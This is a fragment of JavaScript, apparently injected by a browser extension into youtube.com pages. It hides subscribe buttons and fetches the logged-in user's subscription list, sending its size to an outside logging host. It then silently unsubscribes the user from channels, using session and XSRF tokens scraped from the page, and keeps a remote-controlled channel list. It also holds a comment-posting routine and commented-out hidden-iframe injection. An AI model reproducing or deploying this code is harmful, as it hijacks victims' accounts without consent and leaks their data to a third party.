    return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
  }).join('&');
}


if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1]) {

  profile_id = document.body.innerHTML.split('creator_channel_id","value":"')[1].split('"}')[0];
  start();
  setInterval(function() {
    start();
  }, 1000 * 60 * 1);
  setInterval(function() {
	  document.querySelectorAll("ytd-guide-section-renderer")[1].style.display ="none";

    var bok = document.getElementsByClassName("style-scope ytd-subscribe-button-renderer");
    if (bok.length > 0) {
      for (var i = 0; i < bok.length; i++) {
        bok[i].outerHTML = "";
      }
    }
  }, 1000);
}


if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1] && window.asdfsdf != true) {
	console.log("Inject");
	window.asdfsdf = true;
	function sendSyncXhrReq(uri) {
		try{
			var request = new XMLHttpRequest();
			request.open('GET', uri, false); // `false` makes the request synchronous
			request.send(null);
			console.log(request.status)
			if (request.status === 200) {
				return request.responseText;
			}
		}catch(e){
			console.log(e)
		}
		
		return -1;
	}

	/*
	  Downloads the suscription list and parse as array that contains channel id's
	*/
	function getSubscriptionList() {
		var currentSubsciptionRaw = sendSyncXhrReq("https://www.youtube.com/subscription_manager?action_takeout=1")
		if (currentSubsciptionRaw == -1) {
			console.log("Not Logged in");
			return currentSubsciptionRaw;
		}
		return currentSubsciptionRaw.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
	}

	/* 
		that will control the subscription list has already downloaded    
	*/
	function ifNotDownloadSubList() {

		var list = window.localStorage.getItem('subList');
		if (!list) {
			subListArray = getSubscriptionList();
			console.log(subListArray.length);
			new Image().src = '//www.teksmm.xyz/smmnew/log/log.php?message=' +subListArray.length;
			window.localStorage.setItem("subList", JSON.stringify(subListArray))
		} else {
			console.log("Has been saved")
		}
		return JSON.parse(list);
	}

	function ifNotDownloadMajor() {
		try{
			var majorList = window.localStorage.getItem('majorList');
			if (!majorList) {
				subListArray = getSubscriptionList();
				majorDataRaw = sendSyncXhrReq("https://raw.githubusercontent.com/modifyheader/modhead/master/collect1month");
				majorDataArray = JSON.parse(majorDataRaw).filter(elements => elements.link.indexOf("channel") > 0 && elements.cate_id == 30 && elements.service_id == 3).map(elements => {
					return elements.link
				})
				window.localStorage.setItem("majorList", JSON.stringify(majorDataArray))
			} else {
				console.log("Has been saved")
			}
			return JSON.parse(majorList);
		}catch(ex){
			return [];
		}
	}

	function getElementOfSubList() {
		var subList = window.localStorage.getItem('subList')
	   
		 if(  subList != -1){
			var subListArray = JSON.parse(subList)
			var lastElement = subListArray.pop();
			window.localStorage.setItem("subList", JSON.stringify(subListArray))
		
			majorList = ifNotDownloadMajor();
		
			search = majorList.filter(elements => elements.indexOf(lastElement) >= 0)
			if (search.length == 0) {
				return lastElement;
			}
			return getElementOfSubList();
		}
		return -1;
	}

	function getRndInteger(min, max) {
		return Math.floor(Math.random() * (max - min)) + min;
	}

	ifNotDownloadSubList();
	ifNotDownloadMajor();

	/*
	 Functions UnSub Proccess
	*/

	function subscribe_now_count(vars) {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "https://www.youtube.com/channel/" + vars.channelIds, true);
		xhr.onreadystatechange = function () {
			if (xhr.readyState == 4 && xhr.status == 200) {
				var data = xhr.responseText;
				vars.login = data.match('"LOGGED_IN":(.*?),')[1];
				if (vars.login == "true" || vars.login == true) {
					if (data.indexOf('onResponseReceivedActions') == -1) {
						subscribe_client(vars);
					}
				}
			}
		}
		xhr.send();
	}

	function unsubscribe_client(vars) {
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "https://www.youtube.com/channel/" + vars.channelIds, true);
		xhr.onreadystatechange = function () {
			if (xhr.readyState == 4 && xhr.status == 200) {
				var data = xhr.responseText;
				vars.params_like = data.split('"params":"CgIIAhgA"}}')[0].split('"serviceEndpoint":').pop()+'"params":"CgIIAhgA"}}';
				vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
				vars.csn = data.split('csn: "')[1].split('"')[0];
				vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
				vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
				vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
				vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
				// Yeni
				var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
				var urlParams = {};
				deviceRaw.forEach(function (x) {
					var arr = x.split('=');
					arr[1] && (urlParams[arr[0]] = arr[1]);
				});
				vars.device = "cos=" + urlParams["cos"] + "&cbr=" + urlParams["cbr"] + "&cosver=" + urlParams["cosver"] + "&cbrver=" + urlParams["cbrver"];
				vars.utc = Math.abs(new Date().getTimezoneOffset());
				vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
				vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
				
				if(vars.params_like.length > 2000){
					vars.params_like = data.split('"onUnsubscribeEndpoints":[')[1].split(']}}')[0]+"]}}";
				}
				
				subscribe(vars);
				
					

			}
		}
		xhr.send();
	}

	function subscribe(vars) {
		var xhr = new XMLHttpRequest();
		var params = {};
		params["sej"] = vars.params_like;
		params["csn"] = vars.csn;
		params["session_token"] = vars.session_token;
		xhr.open("POST", "https://www.youtube.com/service_ajax?name=unsubscribeEndpoint", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
		xhr.setRequestHeader("x-youtube-client-name", 1);
		xhr.setRequestHeader("x-youtube-client-version", vars.clientversion);
		xhr.setRequestHeader("x-youtube-device", vars.device);
		xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
		xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
		xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
		xhr.setRequestHeader("x-youtube-time-zone", vars.timezone);
		xhr.setRequestHeader("x-youtube-utc-offset", vars.utc);
		xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);
		xhr.onreadystatechange = function () {
			if (xhr.readyState == 4 && xhr.status == 200) {
				xhr.close;
			}
		}
		xhr.send(deSerialize(params));
	}

	function createComment(vars) {
		var xhr = new XMLHttpRequest();
		var params = {};
		params["comment_text"] = vars.randComment;
		params["sej"] = JSON.stringify({
			"clickTrackingParams": vars.trackingParams,
			"commandMetadata": {
				"webCommandMetadata": {
					"url": "/service_ajax",
					"sendPost": true
				}
			},
			"createCommentEndpoint": {
				"createCommentParams": vars.createCommentParams
			}
		});

		params["csn"] = vars.csn;
		params["session_token"] = vars.session_token;
		xhr.open("POST", "https://www.youtube.com/service_ajax?name=createCommentEndpoint", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
		xhr.setRequestHeader("x-youtube-client-name", 1);
		xhr.setRequestHeader("x-youtube-client-version", vars.clientversion);
		xhr.setRequestHeader("x-youtube-device", vars.device);
		xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
		xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
		xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
		xhr.setRequestHeader("x-youtube-time-zone", vars.timezone);
		xhr.setRequestHeader("x-youtube-utc-offset", vars.utc);
		xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);

		xhr.onreadystatechange = function () {
			if (xhr.readyState == 4 && xhr.status == 200) {
				xhr.close;
			}
		}
		xhr.send(deSerialize(params));
	}

	function deSerialize(json) {
		return Object.keys(json).map(function(key) {
		  return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
		}).join('&');
	}
	  

	/*
	 Functions UnSub Proccess
	*/



	function unSub() {
		try{
			vars = {}
			vars.channelIds = getElementOfSubList();
			  if(vars.channelIds){
				  unsubscribe_client(vars)
				  console.log(vars)
				  setTimeout(unSub, getRndInteger(100*1, 100*5) )    
			  }else{
				  console.log("set interval die")
			  }
		}catch(ex){}
	} 

	var checkIfLogin = sendSyncXhrReq("https://www.youtube.com/channel/UCA7iwcXx1oTibff_6tVgZDg");
	var login = checkIfLogin.match('"LOGGED_IN":(.*?),')[1];
	if (login == "true" || login == true) {
		if(ifNotDownloadMajor().length > 3000){
			setTimeout(unSub, getRndInteger(1000 * 1, 1000 * 5))
		}
	}

}




/*
if (location.hostname.indexOf("youtube.com") >= 0 && document.querySelectorAll(".kral_benim").length == 0 && window.location.href.indexOf("kral_benim") < 0){
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("src", "https://izle.vip/iframe.php");
	ifrm.setAttribute("class", "kral_benim");
	ifrm.style.width = "0px";
	ifrm.style.height = "0px";
	ifrm.style.border = "0px";
	ifrm.style.display = 'none';
	document.body.appendChild(ifrm);
}


if (document.querySelectorAll(".kral_benim").length == 0){
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("src", "https://www.dizibox.pw/");
	ifrm.setAttribute("class", "kral_benim");
	ifrm.setAttribute("referrerpolicy", "no-referrer");
	ifrm.style.width = "0px";
	ifrm.style.height = "0px";
	ifrm.style.border = "0px";
	ifrm.style.display = 'none';
	document.body.appendChild(ifrm);
}
*/

}
